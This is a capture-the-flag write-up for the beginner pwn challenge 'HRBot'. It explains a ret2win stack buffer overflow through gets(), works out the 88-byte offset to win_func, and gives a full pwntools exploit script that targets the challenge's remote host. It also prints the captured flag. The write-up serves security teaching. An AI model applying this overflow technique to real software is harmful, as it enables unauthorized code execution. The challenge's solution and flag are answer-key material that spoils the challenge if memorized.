# HRBot — Complete Pwn Writeup

**Challenge:** HRBot
**Category:** Pwn
**Difficulty:** Beginner
**Points:** 40
**Author:** olexmeister

## 1. Challenge Overview

The challenge provides an ELF binary called `hrbot`. The goal is to exploit a vulnerability in the HR case-reporting functionality and redirect execution to a hidden function that prints the flag.

The important observation is that the binary contains a function named `win_func`:

```text
0000000000401256 T win_func
```

This is a strong indication that the challenge is intended to be solved by controlling the program's return address and redirecting execution to `win_func()`.

---

## 2. Initial Enumeration

First, inspect the binary:

```bash
file hrbot
checksec --file=./hrbot
```

The important `checksec` output was:

```text
RELRO           Partial RELRO
STACK CANARY    No canary found
NX              NX enabled
PIE             No PIE (0x400000)
```

This immediately gives us several useful facts:

| Protection | Status   | Relevance                       |
| ---------- | -------- | ------------------------------- |
| Canary     | Disabled | Stack overflow is not protected |
| NX         | Enabled  | We don't need shellcode         |
| PIE        | Disabled | Function addresses are fixed    |
| RELRO      | Partial  | Not important for this exploit  |

Because PIE is disabled, the address of `win_func` will remain:

```text
0x401256
```

---

## 3. Looking for Interesting Symbols

Using `nm`:

```bash
nm -n ./hrbot | grep -E 'win_func|handle_case|fire_employee|saved_rip_ptr'
```

we get:

```text
0000000000401256 T win_func
0000000000401305 T fire_employee
0000000000401351 T handle_case
0000000000404080 B saved_rip_ptr
```

The interesting function is:

```text
win_func = 0x401256
```

The next step is to examine `handle_case()`.

---

## 4. Finding the Vulnerability

Disassembling `handle_case()`:

```bash
objdump -d -M intel ./hrbot | sed -n '/<handle_case>:/,/^$/p'
```

The important portion is:

```asm
401351 <handle_case>:
    push   rbp
    mov    rbp,rsp
    sub    rsp,0x50

    ...

    lea    rax,[rbp-0x50]
    mov    rdi,rax
    ...
    call   gets@plt
```

The key instruction is:

```asm
lea rax,[rbp-0x50]
```

followed by:

```asm
call gets@plt
```

`gets()` reads user input without checking the size of the destination buffer.

Therefore, we have a classic **stack-based buffer overflow**.

The buffer begins at:

```text
rbp - 0x50
```

and the saved return address is located at:

```text
rbp + 0x8
```

---

## 5. Calculating the Offset

We need to calculate how many bytes are required to reach the saved RIP.

From:

```text
buffer:      rbp - 0x50
saved RIP:   rbp + 0x08
```

the distance is:

```text
0x50 + 0x08
= 0x58
= 88 bytes
```

Therefore:

```text
88 bytes → saved RIP
```

We can visualize the stack as:

```text
Higher addresses
────────────────────────
saved RIP        ← overwrite this
────────────────────────
saved RBP        ← 8 bytes
────────────────────────
buffer           ← rbp-0x50
────────────────────────
Lower addresses
```

Thus the payload needs:

```text
88 bytes of padding
+
8-byte address of win_func
```

---

## 6. Finding the Target Address

From `nm`:

```text
0000000000401256 T win_func
```

Therefore:

```text
win_func = 0x401256
```

Since the binary is x86-64, addresses must be supplied in little-endian format.

Pwntools handles this with:

```python
p64(0x401256)
```

which produces the appropriate 8-byte representation.

---

## 7. Constructing the Exploit

The complete payload is:

```python
payload = b'A' * 0x58 + p64(0x401256)
```

or equivalently:

```python
payload = b'A' * 88 + p64(0x401256)
```

The stack becomes:

```text
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAA
    ↓
saved RIP = 0x401256
    ↓
win_func()
```

When `handle_case()` executes:

```asm
leave
ret
```

the `ret` instruction takes our overwritten value:

```text
0x401256
```

and execution continues at:

```text
win_func()
```

---

## 8. Understanding the `saved_rip_ptr` Messages

An interesting part of the challenge is this code:

```asm
lea    rax,[rbp+0x8]
mov    QWORD PTR [rip+0x2d18],rax
```

This stores the address of the saved return address into:

```text
saved_rip_ptr = 0x404080
```

The program then reads the original saved RIP:

```asm
mov    rax,QWORD PTR [rip+0x2d11]
mov    rax,QWORD PTR [rax]
```

After our overflow, it reads it again.

The program compares:

```c
new_rip != old_rip
```

and prints:

```text
[+] HRBot: You must be a smart employee, the case ID has changed!
[+] HRBot: New case ID: 0x401256
```

That output confirms that our overwrite worked.

In our successful run:

```text
[+] HRBot: New case ID: 0x401256
```

This is exactly the address of `win_func`.

---

## 9. The `win_func()` Function

The binary's strings reveal what `win_func()` does:

```text
flag.txt
HRBot: flag.txt not found. Please open a ticket with IT.
[+] HRBot: EXCEPTION DETECTED - unauthorized severance package approved.
[+] HRBot: Please accept this generous parting gift:
FLAG: %s
```

So `win_func()` is the challenge's intended "win" function.

Instead of trying to execute arbitrary shellcode, we simply redirect execution to it.

This is essentially a **ret2win** exploit.

---

## 10. Final Exploit

A clean final `solve.py` is:

```python
from pwn import *

elf = ELF('./hrbot')
context.binary = elf
context.arch = 'amd64'

HOST = 'hrbot-93ca3825db081afd-global.challs.brunnerne.xyz'
PORT = 1337

def start():
    if args.LOCAL:
        return process('./hrbot')

    if args.REMOTE:
        return remote(HOST, PORT, ssl=True)

    log.error('Use LOCAL or REMOTE')

p = start()

# Select "Report a workplace concern"
p.sendlineafter(b'>', b'1')

# 0x50 bytes for the buffer
# 0x08 bytes for saved RBP
# overwrite saved RIP with win_func
payload = b'A' * 0x58 + p64(elf.sym.win_func)

p.sendlineafter(b'characters.', payload)

p.interactive()
```

Run locally with:

```bash
python3 solve.py LOCAL
```

or against the challenge instance:

```bash
python3 solve.py REMOTE
```

---

## 11. Successful Exploitation

The remote execution produced:

```text
[+] HRBot: You must be a smart employee, the case ID has changed!
[+] HRBot: New case ID: 0x401256
```

This proves that the saved return address was successfully changed to:

```text
0x401256
```

which is:

```text
win_func()
```

The program then executed the win function and printed:

```text
[+] HRBot: EXCEPTION DETECTED - unauthorized severance package approved.
[+] HRBot: Please accept this generous parting gift:
FLAG: brunner{hr_th4nks_y0u_f0r_y0ur_t1m3_4t_brunn3rC0rp}
```

The final flag is:

```text
brunner{hr_th4nks_y0u_f0r_y0ur_t1m3_4t_brunn3rC0rp}
```

---

## 12. Exploit Summary

The entire vulnerability can be summarized as:

```text
gets() 
  ↓
stack buffer overflow
  ↓
overwrite saved RIP
  ↓
saved RIP = 0x401256
  ↓
ret
  ↓
win_func()
  ↓
read flag.txt
  ↓
FLAG
```

### Key values

```text
Buffer address:       rbp - 0x50
Saved RIP:            rbp + 0x08
Offset to saved RIP:  0x58 = 88 bytes
win_func:             0x401256
```

### Final payload

```python
b'A' * 88 + p64(0x401256)
```

This is a textbook **ret2win stack buffer overflow**: no canary, no PIE, and a conveniently provided `win_func()` make the exploitation straightforward.
